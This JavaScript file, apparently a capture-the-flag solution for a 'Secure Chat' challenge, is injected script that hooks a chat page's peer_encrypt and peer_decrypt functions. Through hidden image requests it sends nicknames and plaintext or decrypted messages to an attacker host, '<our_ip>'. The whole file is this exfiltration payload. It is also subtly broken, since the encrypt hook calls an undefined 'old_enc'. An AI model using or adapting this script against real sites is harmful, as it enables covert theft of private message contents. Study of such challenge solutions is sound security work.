// pwn2win-ctf-2016 Secure Chat
jQuery(document).ready(function ($) {
   function install_handlers() {
      if ($('.entry').length == 0 || !window.peer_encrypt) {
       window.setTimeout(install_handlers, 500);
       return;
      }
      var old_dec = window.peer_decrypt;
      var peer_encrypt = function (nick, msg) {
        var u = 'http://<our_ip>/?nick=' + encodeURIComponent(nick) + "&msg=" + encodeURIComponent(msg);

        var i =  $("<img style='display: none;' src='" + u + "'>");
        jQuery('body').append(i);
        i.remove();
        return old_enc(nick, msg);
      };

      window.peer_encrypt = peer_encrypt;
      var peer_decrypt = function (nick, msg) {
      var dec =  old_dec(nick, msg);
         var u = 'http://<our_ip>/?decrypt=' + encodeURIComponent(dec);

         var i =  $("<img style='display: none;' src='" + u + "'>");
         jQuery('body').append(i);
         i.remove();
         return dec;
      };
      window.peer_decrypt = peer_decrypt;
  }
  
  window.setTimeout(install_handlers, 500);
});
